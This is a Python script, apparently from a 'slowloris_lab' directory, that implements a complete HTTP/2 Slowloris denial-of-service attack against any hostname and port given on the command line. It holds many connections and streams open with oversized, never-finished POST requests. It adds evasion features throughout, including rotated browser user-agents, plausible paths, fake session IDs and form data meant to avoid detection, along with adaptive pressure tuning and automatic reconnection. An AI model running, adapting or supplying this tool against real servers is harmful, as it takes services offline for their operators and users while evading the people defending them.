# slowloris_lab/cloud_slowloris.py - Raw HTTP/2 Cloud Version

import socket
import ssl
import threading
import time
import random
import sys
import argparse
import json
from datetime import datetime
import base64
import hashlib
import h2.connection
import h2.events
import h2.config

# A global threading.Event to signal all worker threads to stop gracefully.
stop_event = threading.Event()

# Realistic User-Agent strings to avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0"
]

# Legitimate-looking paths to request
LEGIT_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/login", "/search", "/products", "/services", "/news",
    "/blog", "/support", "/help", "/faq", "/pricing", "/download", "/register", "/profile", "/dashboard", "/admin"
]

# Enhanced attack state for HTTP/2
class HTTP2AttackState:
    """
    Thread-safe class to manage HTTP/2 attack parameters.
    Coordinates multiple connections with adaptive stream management.
    """
    def __init__(self, initial_sleep, streams_per_connection, stealth_mode):
        self.sleep_interval = initial_sleep
        self.streams_per_connection = streams_per_connection
        self.stealth_mode = stealth_mode
        self.active_connections = 0
        self.total_streams = 0
        self.failed_connections = 0
        self.lock = threading.Lock()
        self.last_pressure_increase = time.time()

    def get_sleep_interval(self):
        with self.lock:
            return self.sleep_interval

    def set_sleep_interval(self, new_interval):
        with self.lock:
            if self.sleep_interval != new_interval:
                print(f"[!] Sleep interval adjusted: {new_interval}s (stealth: {self.stealth_mode})")
                self.sleep_interval = new_interval

    def get_streams_per_connection(self):
        with self.lock:
            return self.streams_per_connection

    def set_streams_per_connection(self, new_count):
        with self.lock:
            if self.streams_per_connection != new_count:
                print(f"[!] Streams per connection adjusted: {new_count}")
                self.streams_per_connection = new_count

    def update_connection_stats(self, active, total_streams, failed):
        with self.lock:
            self.active_connections = active
            self.total_streams = total_streams
            self.failed_connections = failed

    def get_adaptive_params(self):
        """Calculate adaptive parameters based on connection success/failure rates"""
        with self.lock:
            if self.failed_connections > self.active_connections * 0.2:  # High failure rate
                # Be more conservative
                new_sleep = min(30, self.sleep_interval + 3)
                new_streams = max(10, self.streams_per_connection - 2)
                return new_sleep, new_streams
            elif self.failed_connections < self.active_connections * 0.05:  # Low failure rate
                # Can be more aggressive
                new_sleep = max(5, self.sleep_interval - 2)
                new_streams = min(60, self.streams_per_connection + 2)
                return new_sleep, new_streams
            else:
                return self.sleep_interval, self.streams_per_connection

class CloudHTTP2ConnectionWorker(threading.Thread):
    """
    Advanced HTTP/2 connection worker for cloud environments with stealth features.
    Uses raw h2 library for complete control over HTTP/2 streams.
    """
    def __init__(self, target_host, target_port, attack_state, connection_id):
        super().__init__()
        self.target_host = target_host
        self.target_port = target_port
        self.attack_state = attack_state
        self.connection_id = connection_id
        self.sock = None
        self.conn = None
        self.active_streams = {}
        self.next_stream_id = 1
        self.start_time = time.time()

    def generate_stealth_headers(self, stream_id):
        """Generate legitimate-looking headers for stealth"""
        path = random.choice(LEGIT_PATHS)
        if stream_id:
            path += f"?session={self.generate_session_id()}&id={stream_id}"
        
        return [
            (':method', 'POST'),
            (':path', path),
            (':authority', f"{self.target_host}:{self.target_port}"),
            (':scheme', 'http'),
            ('user-agent', random.choice(USER_AGENTS)),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
            ('accept-language', 'en-US,en;q=0.5'),
            ('accept-encoding', 'gzip, deflate'),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('content-length', str(random.randint(5000000, 20000000))),  # 5-20MB
            ('connection', 'keep-alive'),
            ('upgrade-insecure-requests', '1'),
            ('sec-fetch-dest', 'document'),
            ('sec-fetch-mode', 'navigate'),
            ('sec-fetch-site', 'none'),
            ('sec-fetch-user', '?1'),
            ('cache-control', 'max-age=0'),
            ('expect', '100-continue')
        ]

    def generate_session_id(self):
        """Generate realistic session ID"""
        return base64.b64encode(f"{self.connection_id}_{time.time()}_{random.randint(1000,9999)}".encode()).decode()[:32]

    def generate_realistic_payload(self):
        """Generate realistic form payload"""
        fields = []
        
        # Add common form fields
        fields.append(f"username=user{random.randint(1000, 9999)}")
        fields.append(f"email=user{random.randint(100, 999)}@example.com")
        fields.append(f"session_id={self.generate_session_id()}")
        fields.append(f"csrf_token={hashlib.md5(str(time.time()).encode()).hexdigest()}")
        
        # Add large text field to consume resources
        words = ["the", "quick", "brown", "fox", "jumps", "over", "lazy", "dog", "and", "runs", "through", "forest"] * 50
        large_text = " ".join(random.choices(words, k=random.randint(200, 800)))
        fields.append(f"comment={large_text}")
        
        return "&".join(fields)

    def run(self):
        """The main logic for the HTTP/2 connection worker."""
        try:
            self.connect_and_attack()
        except Exception as e:
            print(f"[!] Cloud connection {self.connection_id} failed: {e}")
        finally:
            if self.sock:
                self.sock.close()
    
    def connect_and_attack(self):
        """Establish HTTP/2 connection and start cloud-optimized attack."""
        # Create socket connection with cloud-friendly timeouts
        self.sock = socket.create_connection((self.target_host, self.target_port), timeout=45)
        self.sock.settimeout(2.0)  # Longer timeout for cloud latency
        
        # Create HTTP/2 connection
        config = h2.config.H2Configuration(client_side=True)
        self.conn = h2.connection.H2Connection(config=config)
        self.conn.initiate_connection()
        
        # Send connection preface
        self.sock.sendall(self.conn.data_to_send())
        
        # Create initial slow streams with cloud optimizations
        self.create_cloud_optimized_streams()
        
        # Main event loop with cloud-aware handling
        while not stop_event.is_set():
            try:
                # Handle incoming data
                data = self.sock.recv(65535)
                if not data:
                    break
                    
                events = self.conn.receive_data(data)
                self.handle_events(events)
                
                # Send any pending data
                data_to_send = self.conn.data_to_send()
                if data_to_send:
                    self.sock.sendall(data_to_send)
                    
            except socket.timeout:
                # Timeout is expected in cloud environments
                pass
            except Exception as e:
                print(f"[!] Cloud connection {self.connection_id} error: {e}")
                break
                
            # Maintain streams with cloud-aware intervals
            self.maintain_cloud_streams()
            time.sleep(random.uniform(2, 5))  # Longer intervals for cloud stealth
    
    def create_cloud_optimized_streams(self):
        """Create initial set of cloud-optimized incomplete HTTP/2 streams."""
        streams_count = self.attack_state.get_streams_per_connection()
        
        for i in range(min(streams_count, 40)):  # Reasonable limit for cloud
            self.create_stealth_incomplete_stream()
            time.sleep(random.uniform(0.2, 0.8))  # Stagger for cloud stealth
    
    def create_stealth_incomplete_stream(self):
        """Create a single stealth incomplete HTTP/2 stream optimized for cloud."""
        if self.next_stream_id > 2000:  # Higher limit for cloud
            return
            
        stream_id = self.next_stream_id
        self.next_stream_id += 2  # Client streams must be odd
        
        try:
            # Create stealth headers
            headers = self.generate_stealth_headers(stream_id)
            
            # Send headers (but no END_STREAM flag)
            self.conn.send_headers(stream_id, headers, end_stream=False)
            
            # Track this stream with cloud metadata
            content_length = int([h[1] for h in headers if h[0] == 'content-length'][0])
            self.active_streams[stream_id] = {
                'created': time.time(),
                'data_sent': 0,
                'target_size': content_length,
                'payload': self.generate_realistic_payload()
            }
            
            # Send initial data to the socket
            data_to_send = self.conn.data_to_send()
            if data_to_send:
                self.sock.sendall(data_to_send)
                
        except Exception as e:
            print(f"[!] Failed to create stealth stream {stream_id}: {e}")
    
    def maintain_cloud_streams(self):
        """Send small data chunks to keep streams alive with cloud stealth."""
        current_time = time.time()
        streams_to_remove = []
        
        for stream_id, stream_info in self.active_streams.items():
            try:
                # Check if stream is still valid
                if stream_id not in [s.stream_id for s in self.conn.streams.values()]:
                    streams_to_remove.append(stream_id)
                    continue
                
                # Send small data chunk occasionally with cloud timing
                last_activity = stream_info.get('last_data', stream_info['created'])
                if current_time - last_activity > random.uniform(10, 30):  # Longer intervals for cloud
                    remaining_size = stream_info['target_size'] - stream_info['data_sent']
                    chunk_size = min(random.randint(50, 200), remaining_size)  # Slightly larger chunks for cloud
                    
                    if chunk_size > 0:
                        # Use part of the realistic payload
                        payload = stream_info['payload'].encode()
                        start_pos = stream_info['data_sent'] % len(payload)
                        chunk_data = payload[start_pos:start_pos + chunk_size]
                        if len(chunk_data) < chunk_size:
                            chunk_data += b'x' * (chunk_size - len(chunk_data))
                        
                        # Send small chunk of data (but not END_STREAM)
                        self.conn.send_data(stream_id, chunk_data, end_stream=False)
                        
                        stream_info['data_sent'] += chunk_size
                        stream_info['last_data'] = current_time
                        
                        # Send to socket
                        data_to_send = self.conn.data_to_send()
                        if data_to_send:
                            self.sock.sendall(data_to_send)
                    
            except Exception as e:
                streams_to_remove.append(stream_id)
        
        # Remove dead streams
        for stream_id in streams_to_remove:
            self.active_streams.pop(stream_id, None)
        
        # Create new streams to replace dead ones (cloud-aware)
        target_streams = self.attack_state.get_streams_per_connection()
        current_streams = len(self.active_streams)
        
        if current_streams < target_streams:
            streams_to_create = min(3, target_streams - current_streams)  # Conservative for cloud
            for _ in range(streams_to_create):
                self.create_stealth_incomplete_stream()
    
    def handle_events(self, events):
        """Handle HTTP/2 events from server with cloud awareness."""
        for event in events:
            if isinstance(event, h2.events.StreamEnded):
                # Stream was closed by server, remove from tracking
                self.active_streams.pop(event.stream_id, None)
            elif isinstance(event, h2.events.ConnectionTerminated):
                # Connection terminated
                print(f"[!] Cloud connection {self.connection_id} terminated by server")
                break

def cloud_status_monitor(attack_state, connections):
    """Monitor and display cloud attack status"""
    while not stop_event.is_set():
        time.sleep(8)  # Longer intervals for cloud monitoring
        
        # Count active connections and streams
        active_conns = sum(1 for conn in connections if conn.is_alive())
        total_streams = sum(len(conn.active_streams) for conn in connections if hasattr(conn, 'active_streams'))
        failed_conns = len(connections) - active_conns
        
        # Update attack state
        attack_state.update_connection_stats(active_conns, total_streams, failed_conns)
        
        # Adaptive adjustment with cloud parameters
        new_sleep, new_streams = attack_state.get_adaptive_params()
        attack_state.set_sleep_interval(new_sleep)
        attack_state.set_streams_per_connection(new_streams)
        
        # Print cloud status
        uptime = time.time() - start_time if 'start_time' in globals() else 0
        print(f"[CLOUD STATUS] Uptime: {uptime:.0f}s | Connections: {active_conns}/{len(connections)} | "
              f"Total Streams: {total_streams} | Failed: {failed_conns} | "
              f"Sleep Interval: {attack_state.get_sleep_interval()}s | "
              f"Streams/Conn: {attack_state.get_streams_per_connection()}")

def main():
    """Main function for cloud-optimized HTTP/2 Slowloris attack"""
    global start_time
    start_time = time.time()
    
    parser = argparse.ArgumentParser(description="Cloud-Optimized HTTP/2 Slowloris Attack with Raw h2")
    parser.add_argument("hostname", help="Target hostname or IP address")
    parser.add_argument("connections", type=int, help="Number of HTTP/2 connections to maintain")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--streams", type=int, default=35, help="Streams per connection (default: 35)")
    parser.add_argument("--sleep", type=int, default=18, help="Base sleep interval (default: 18s)")
    parser.add_argument("--stealth", action="store_true", help="Enable enhanced stealth mode")
    
    args = parser.parse_args()
    
    # Create cloud-optimized attack state
    attack_state = HTTP2AttackState(args.sleep, args.streams, args.stealth)
    
    print("Cloud-Optimized HTTP/2 Slowloris Attack - Raw h2 Library")
    print("=" * 70)
    print(f"Target: {args.hostname}:{args.port}")
    print(f"Connections: {args.connections}")
    print(f"Streams per connection: {args.streams}")
    print(f"Base sleep interval: {args.sleep}s")
    print(f"Enhanced stealth mode: {'Enabled' if args.stealth else 'Disabled'}")
    print("Features: Raw HTTP/2 control, adaptive timing, realistic payloads, cloud optimization")
    print("Press Ctrl+C to stop the attack")
    print("=" * 70)
    
    # Create cloud-optimized HTTP/2 connections
    connections = []
    
    try:
        # Start cloud status monitor
        monitor_thread = threading.Thread(target=cloud_status_monitor, args=(attack_state, connections), daemon=True)
        monitor_thread.start()
        
        # Create and start connections with cloud-aware staggering
        for i in range(args.connections):
            conn = CloudHTTP2ConnectionWorker(args.hostname, args.port, attack_state, i)
            conn.start()
            connections.append(conn)
            
            # Longer stagger intervals for cloud stealth
            time.sleep(random.uniform(1.0, 3.0))
            
            if stop_event.is_set():
                break
        
        print(f"\n[CLOUD ATTACK] {len(connections)} HTTP/2 connections launched")
        
        # Main manager loop with cloud adaptations
        while not stop_event.is_set():
            # Prune dead connections
            active_connections = [conn for conn in connections if conn.is_alive()]
            dropped_count = len(connections) - len(active_connections)
            
            if dropped_count > 0:
                print(f"[!] {dropped_count} connections dropped, attempting to replenish...")
                
                # Replenish connections
                for i in range(dropped_count):
                    new_conn = CloudHTTP2ConnectionWorker(args.hostname, args.port, attack_state, len(connections) + i)
                    new_conn.start()
                    connections.append(new_conn)
                    time.sleep(random.uniform(2, 5))  # Cloud-aware replenishment rate
            
            time.sleep(10)  # Longer management intervals for cloud
            
    except KeyboardInterrupt:
        print("\n[CLOUD SHUTDOWN] Stopping attack...")
        stop_event.set()
        
        # Wait for connections to stop with cloud timeouts
        for conn in connections:
            conn.join(timeout=15)
        
        print("[CLOUD SHUTDOWN] Attack stopped successfully")

if __name__ == "__main__":
    main()